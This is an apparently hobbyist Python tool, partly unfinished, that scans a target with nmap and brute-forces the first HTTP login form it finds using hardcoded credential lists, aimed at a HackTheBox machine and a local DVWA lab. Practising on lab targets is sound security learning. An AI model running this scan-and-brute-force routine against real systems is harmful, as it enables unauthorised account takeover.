import urllib
from pathlib import Path
from pprint import pprint
from typing import Optional, List, Set, Union, Dict, Tuple

import mechanize
import nmap3
import lxml
from lxml import etree
from lxml import objectify
from mechanize import HTMLForm, TextControl, PasswordControl, Request, Link

from VulnerabilityFeatures import BoxVulnerabilityFeature

nmap = nmap3.Nmap()
SERVICE_NAMES = [
    'ssh', 'http',
]


class CredentialsDatabase:
    def __init__(self):
        pass


def determine_form_type(f: HTMLForm) -> str:
    """
    Use "advanced logic" and "epic facts" to determine what type of form a form is... wew
    :param f:
    :return:
    """
    if 'login' in f.action:
        return 'login'

    raise NotImplementedError("Not sure what to do for this form: " + repr(f))


class NMAPResult:
    def __init__(self, raw_xml: str):
        self.raw_xml = raw_xml
        self.data: lxml.etree.Element = etree.fromstring(self.raw_xml.encode('ascii'))
        self.objectified_data: lxml.objectify.ObjectifiedElement = objectify.fromstring(self.raw_xml.encode('ascii'))

    def extractVulnFeatures(self) -> Set[BoxVulnerabilityFeature]:
        """From my results, what vulnerable features does this scan exhibit?"""
        raise NotImplemented('lol im lazy')

    def isOnline(self) -> bool:
        """Does this nmap result say host is online?"""
        state = self.data.xpath('//nmaprun/host/status/@state')

        if len(state) > 0:
            return state[0] == 'up'

        return False

    def getServices(self, service: str) -> List[lxml.etree.Element]:
        return self.data.xpath(f'//nmaprun/host/ports/port/service[@name="{service}"]')

    def getServicePort(self, service: str) -> Union[bool, int]:
        """
        :param service: Name of service, i.e. 'ssh'
        :return: Port number of service, or False if service DNE.
        """
        foo = self.getServices(service)

        if len(foo) > 0:
            port = foo[0].xpath('../@portid')[0]
            return port

        return False

    def hasSSH(self) -> Union[bool, int]:
        return self.getServicePort('ssh')

    def hasHTTPServer(self) -> Union[bool, int]:
        return self.getServicePort('http')


class Box:
    def __init__(self, name: str,
                 ip: Optional[str] = None, hostname: Optional[str] = None):
        self.name = name
        self.ip = ip
        self.hostname = hostname
        self.http_scanner = HttpModule(self)
        self.nmap_results: List[NMAPResult] = []
        self.service_ports: Dict[str, int] = {}

    def has_nmap_results(self):
        return len(self.nmap_results) > 0

    def last_nmap_result(self):
        if self.has_nmap_results():
            return self.nmap_results[-1]

        return False

    def get_ip_or_hostname(self):
        if self.ip:
            return self.ip

        if self.hostname:
            return self.hostname

        raise ValueError("Error! {} doesn't have an IP or Hostname!".format(self))

    def has_http_forms(self):
        if self.http_scanner.has_results():
            raise NotImplementedError("wowie check for le forms")

    def __repr__(self):
        return f"<Box name='{self.name}' online='{self.is_online()}' ip='{self.ip}' hostname='{self.hostname}'>"

    def get_service_port(self, serviceName: str) -> Union[int, None]:
        return self.service_ports.get(serviceName, None)

    def run_nmap_scan(self, args=('-sC', '-sV'), import_nmap_xml_filepath: str = None):

        if import_nmap_xml_filepath:
            with open(import_nmap_xml_filepath, 'r') as f:
                nmapres = NMAPResult(f.read())
        else:
            cmd = [nmap.nmaptool]
            cmd.extend(args)
            cmd.extend([self.get_ip_or_hostname(), '-oX', '-'])

            xml = nmap.run_command(cmd)

            nmapres = NMAPResult(xml)

        self.nmap_results.append(nmapres)

        for servicename in SERVICE_NAMES:
            if nmapres.getServicePort(servicename):
                self.service_ports[servicename] = nmapres.getServicePort(servicename)

        return self.nmap_results

    def is_online(self) -> bool:
        if not self.has_nmap_results():
            return False

        return self.last_nmap_result().isOnline()


class HttpModule:
    def __init__(self, box: Box):
        self.box = box
        self.browser: mechanize.Browser = mechanize.Browser()
        self.browser.set_handle_robots(False)  # lol

    def has_results(self):
        return False  # TODO NYI

    def initial_http_scan(self):
        target = self.box.get_ip_or_hostname()
        target = "http://" + target + ":" + self.box.get_service_port('http') + "/"
        print("target={0}".format(target))

        try:
            self.browser.open(target)
        except ConnectionRefusedError as cre:
            print("Connection refused to {}. Are you sure there is an HTTP server running?".format(target))
            raise cre
        except urllib.error.URLError as urle:
            print("Connection refused to {}. Are you sure there is an HTTP server running?".format(target))
            raise urle

    # TODO: This method is extremely long... ;_; fugg DDDD:
    def bruteforce_login_form(
            self,
            usernames: Union[Path, List[str]] = None,
            passwords: Union[Path, List[str]] = None) -> Tuple[str, str]:

        if not usernames:
            usernames = ['bobby', 'robby', 'admin']

        if not passwords:
            passwords = ['foobarbazqux', 'wheresthebeef', 'password']

        if isinstance(usernames, Path):
            raise NotImplementedError("Load usernames from a path...")

        if isinstance(usernames, Path):
            raise NotImplementedError("Load passwords from a path...")

        if not self.has_results():
            self.initial_http_scan()

        # redirs: Dict[str, int] = self.browser.request.redirect_dict
        # if len(redirs) > 0:
        #     pprint(redirs)
        #     raise NotImplementedError("We are being redirected! TODO")

        links: Tuple[Link] = self.browser.links()
        print("links: ")
        pprint(links)

        all_forms: List[HTMLForm] = self.browser.forms()
        print("forms: ")
        pprint(all_forms)

        # TODO: What if there are multiple forms? Or 0?
        if len(all_forms) <= 0:
            raise Exception("There are no forms! Cannot bruteforce!")

        form_candidate: HTMLForm = all_forms[0]

        if determine_form_type(form_candidate) != 'login':
            raise Exception("Cannot bruteforce this type of form: " + determine_form_type(form_candidate))

        print("about to bruteforce " + form_candidate.action)

        seen_urls = {}
        last_url = self.browser.geturl()

        # main fuzzer loop...
        # TODO can we use a different module to handle this?
        username: str
        for username in usernames:

            password: str
            for password in passwords:

                print()
                print("going to try {0}".format(":".join((username, password))))

                # TODO: Don't hardcode these input names
                form_candidate['username'] = username
                form_candidate['password'] = password

                fuzzingRequest: Request = form_candidate.click()

                # store url we have before we send a request...
                last_url = self.browser.geturl()

                fuzzingResponse = self.browser.open(url_or_request=fuzzingRequest)

                current_url: str = self.browser.geturl()
                print("response url: " + current_url)

                if not (current_url == last_url):  # TODO: Formalize this heuristic, and what happens if it fails?
                    print("Different URL!\n {} != {}\n"
                          " We will use this as the heuristic that proves this "
                          "form has been successfully brute-forced!".format(last_url, current_url))
                    return username, password

                # update how many urls we've seen before. not sure what we can use this metric for...
                if current_url not in seen_urls:
                    seen_urls[current_url] = 0
                seen_urls[current_url] += 1

                # TODO analyze response, use heuristics to determine if form post was successful

                # this step is important, it copies the new CSRF token...
                all_forms = self.browser.forms()
                if len(all_forms) > 0:
                    form_candidate = all_forms[0]
                else:
                    raise ValueError("Got returned 0 forms from '{}'!".format(self.browser.geturl()))

        raise ValueError("Failed to find credentials for form '{}'!".format(self.browser.geturl()))


def hackthe(box: Box) -> Box:
    # box.run_nmap_scan()

    # save time, import xml instead of running new nmap scan
    if box.name == 'dvwa':
        box.run_nmap_scan(import_nmap_xml_filepath='../data/DVWA.xml')
    else:
        box.run_nmap_scan()

    if box.is_online():
        print(f"Most recent nmap scan says box {box} is online!")
    else:
        raise ConnectionError(f"Box {box} is offline!")

    if box.last_nmap_result().hasHTTPServer():
        print("target has an HTTP server!")

        creds = box.http_scanner.bruteforce_login_form()

        print("Login form creds: {}".format(creds))

    return box


# corresponds to "Horizontall" box: <https://app.hackthebox.com/machines/374>
Horizontall = Box('horizontall',
                  ip='10.10.11.105')

DVWA = Box('dvwa',
           hostname='localhost')  # TODO can we pass port 6789?


# NOTE: If you're trying to bruteforce DVWA box, you must first set up the database manually by going to:
# http://localhost:6789/setup.php


def familyfriendlyWithDummyNMAPresults():
    with open('../data/Horizontall.xml', 'r') as f:
        dummy_nmap_result = NMAPResult(raw_xml=f.read())

    gay1 = dummy_nmap_result.isOnline()

    gay2 = dummy_nmap_result.getServices('ssh')
    gay3 = dummy_nmap_result.hasHTTPServer()
    gay4 = dummy_nmap_result.hasSSH()
    print(" >:3c ")


if __name__ == '__main__':
    # # debug xml section
    # familyfriendlyWithDummyNMAPresults()
    # raise Exception("familyfriendlymywummy, debug webug")

    # hackthe(Horizontall)
    hackthe(DVWA)
